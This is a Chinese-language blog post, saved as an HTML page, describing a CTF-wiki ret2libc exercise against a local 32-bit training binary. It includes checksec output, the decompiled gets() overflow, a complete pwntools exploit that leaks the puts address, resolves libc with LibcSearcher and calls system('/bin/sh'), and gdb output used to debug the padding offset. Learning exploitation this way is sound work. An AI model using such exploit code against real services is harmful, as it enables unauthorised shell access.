@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="p4IkzO1jTITYkH5zlZW5A3-JHuC0DVJvFSM-3cYRn-k" />
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn学习," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在家无聊了的第二天，继续学习pwn的知识​    今天看了看wiki-ret2libc的内容，觉得受益匪浅。 原理​    ret2libc说白了就是让我们之前的ret不往shellcode或者vul上跳 而是跳到了某个函数的plt或者got的位置  从而实现控制程序的函数去执行libc中的函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn学习之ret2libc">
+<meta property="og:url" content="https://huangpiao.tech/2020/01/29/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc/index.html">
+<meta property="og:site_name" content="x1a0g&#39;Blog">
+<meta property="og:description" content="在家无聊了的第二天，继续学习pwn的知识​    今天看了看wiki-ret2libc的内容，觉得受益匪浅。 原理​    ret2libc说白了就是让我们之前的ret不往shellcode或者vul上跳 而是跳到了某个函数的plt或者got的位置  从而实现控制程序的函数去执行libc中的函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-01-29T10:07:07.000Z">
+<meta property="article:modified_time" content="2020-01-29T11:15:46.551Z">
+<meta property="article:author" content="x1a0g">
+<meta property="article:tag" content="pwn学习">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://huangpiao.tech/2020/01/29/pwn学习之ret2libc/"/>
+
+
+
+
+
+  <title>pwn学习之ret2libc | x1a0g'Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">x1a0g'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://huangpiao.tech/2020/01/29/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="x1a0g">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x1a0g'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwn学习之ret2libc</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-29T18:07:07+08:00">
+                2020-01-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="在家无聊了的第二天，继续学习pwn的知识"><a href="#在家无聊了的第二天，继续学习pwn的知识" class="headerlink" title="在家无聊了的第二天，继续学习pwn的知识"></a>在家无聊了的第二天，继续学习pwn的知识</h4><p>​    今天看了看wiki-ret2libc的内容，觉得受益匪浅。</p>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​    ret2libc说白了就是让我们之前的ret不往shellcode或者vul上跳 而是跳到了某个函数的plt或者got的位置  从而实现控制程序的函数去执行libc中的函数</p>
+<a id="more"></a>
+
+<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>​    这里使用了wiki上的例子来练习，wiki给了三种情况  ：</p>
+<pre><code>- 有system  有  /bin/sh
+- 有system  无  /bin/sh
+- 无system  无 /bin/sh</code></pre><p>我们着重来说第三种方式  这种也是某些ctf题目中可以见到的  额当然 现在比赛还是heap占大多数</p>
+<p>ok  我们拿到例子后  还是拿checksec  检测一下  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>发现开的NX是个32位的ELF  然后拿到ida去分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No surprise anymore, system disappeard QQ."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Can you find it !?"</span>);</span><br><span class="line">  gets(&amp;s);     <span class="comment">//gets存在明显的栈溢出漏洞  </span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于人家没给咱们so文件  所以就只能自己去泄露他的版本了</p>
+<p>然后  计算偏移的过程就不贴了    offset最后为112</p>
+<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>我们来总结一下思路</p>
+<ul>
+<li><p>首先先得找到一个在我们溢出之前使用过的函数  我这里选择使用puts函数 来通过溢出漏洞泄露他的地址</p>
+<ul>
+<li>有时候我们并不一定非得直接知道某个函数的地址，可以利用 GOT 表跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用 write，puts 等输出函数将 GOT 表中地址处对应的内容输出出来（前提是这个函数已经被解析一次了）    ——-摘自wiki</li>
+</ul>
+</li>
+<li><p>接着我们可以通过 libcsearcher  来查找对应版本的libc   </p>
+<ul>
+<li>libcsearcher是大佬写出来专门 做pwn题的一个python模块  可以根据我们函数的地址来查找对应的libc版本</li>
+<li>为何没有选择dynelf来做   因为 考虑到漏洞点是出在gets函数上  由于gets函数遇到\x0a(即换行)会结束 所以没有选择这种方法 如果漏洞点处在read函数上就可以考虑使用dynelf来泄露地址</li>
+</ul>
+</li>
+<li><p>找到libc版本之后去计算我们的system的地址和/bin/sh的地址</p>
+<ul>
+<li><p>当我们有了libc的版本之后可以通过libcsearcher给出的方法去计算   </p>
+<ul>
+<li><pre><code class="python"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *
+
+<span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span>
+obj = LibcSearcher(<span class="string">"fgets"</span>, <span class="number">0X7ff39014bd90</span>)
+
+obj.dump(<span class="string">"system"</span>)        <span class="comment">#system 偏移</span>
+obj.dump(<span class="string">"str_bin_sh"</span>)    <span class="comment">#/bin/sh 偏移</span>
+obj.dump(<span class="string">"__libc_start_main_ret"</span>)    
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 之后再次去执行main函数去我们的溢出点构造我们第二次发送的payload</span><br><span class="line"></span><br><span class="line">##### exp</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">io = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">puts_got_addr = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">raw_input()</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">112</span>+p32(puts_plt_addr)+p32(main_addr)+p32(puts_got_addr)</span><br><span class="line">io.recvuntil(<span class="string">'!?'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">obj_base = puts_addr-obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">sys_addr=obj.dump(<span class="string">'system'</span>)+obj_base</span><br><span class="line">bin_sh_addr = obj.dump(<span class="string">'str_bin_sh'</span>)+obj_base</span><br><span class="line"></span><br><span class="line">#io.recvuntil(<span class="string">'!?'</span>)</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">104</span>+p32(sys_addr)+<span class="string">'bbbb'</span>+p32(bin_sh_addr)  #这里的a为何为<span class="number">104</span>下面给出我个人的看法</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="gdb-分析"><a href="#gdb-分析" class="headerlink" title="gdb 分析"></a>gdb 分析</h5><p>​    其实上面这个104  我在最开始时写的是112  于是造成了payload打不通的情况  于是拿gdb  at上去分析一下    以下是我分析所得出的结论 如果有错误希望师傅们及时指正：</p>
+<p>​    首先定位到第二次发送完payload要ret的时候   就是我们第二次call  gets的那个地方的ret  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7f365a0 --&gt; 0xfbad2288 </span><br><span class="line">EDX: 0xf7f3787c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7f36000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xf7f36000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">ESP: 0xffd164e8 (<span class="string">"aaaa\240\355\333\367bbbb\v\372\355"</span>, &lt;incomplete sequence \367&gt;)</span><br><span class="line">EIP: 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x61616161</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffd164e8 (<span class="string">"aaaa\240\355\333\367bbbb\v\372\355"</span>, &lt;incomplete sequence \367&gt;)</span><br><span class="line">0004| 0xffd164ec --&gt; 0xf7dbeda0 (&lt;__libc_system&gt;:	sub    esp,0xc)</span><br><span class="line">0008| 0xffd164f0 (<span class="string">"bbbb\v\372\355"</span>, &lt;incomplete sequence \367&gt;)</span><br><span class="line">0012| 0xffd164f4 --&gt; 0xf7edfa0b (<span class="string">"/bin/sh"</span>)</span><br><span class="line">0016| 0xffd164f8 --&gt; 0xf7f36000 --&gt; 0x1b1db0 </span><br><span class="line">0020| 0xffd164fc --&gt; 0xf7f7dc04 --&gt; 0x0 </span><br><span class="line">0024| 0xffd16500 --&gt; 0xf7f7d000 --&gt; 0x23f40 </span><br><span class="line">0028| 0xffd16504 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x61616161 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>
+
+<p>本来我们当ret跳转的时候  eip应该为我们的system的地址    但是这个地方直接去ret回了 0x61616161  这个地方  说明我们的buffer的偏移存在问题  正常来是 我们应该覆盖到ebp就不能在覆盖了   但是这个位置我们可以看到 明显多了esp  和 eip的  一共 8个a  所以我们应该减去8个  也就是104个   这就是我自己的解决这个问题的办法  至于原理我自己的理解应该是当我们第一次发送完payload再次进入main函数的时候  我们没有去平衡栈帧   所以导致了堆栈平衡的问题</p>
+<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p>​        <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2libc" target="_blank" rel="noopener">ctf-wiki—–基本Rop</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn%E5%AD%A6%E4%B9%A0/" rel="tag"># pwn学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/28/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bsyscall/" rel="next" title="pwn学习之syscall">
+                <i class="fa fa-chevron-left"></i> pwn学习之syscall
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/30/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8Bret2libc%E7%BB%83%E4%B9%A0(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/" rel="prev" title="pwn学习之ret2libc练习（攻防世界level3）">
+                pwn学习之ret2libc练习（攻防世界level3） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">x1a0g</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/x1a0g" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wx975lm@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#在家无聊了的第二天，继续学习pwn的知识"><span class="nav-number">1.</span> <span class="nav-text">在家无聊了的第二天，继续学习pwn的知识</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例子"><span class="nav-number">1.2.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#思路"><span class="nav-number">1.3.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#gdb-分析"><span class="nav-number">1.4.</span> <span class="nav-text">gdb 分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考文章："><span class="nav-number">1.5.</span> <span class="nav-text">参考文章：</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">x1a0g</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
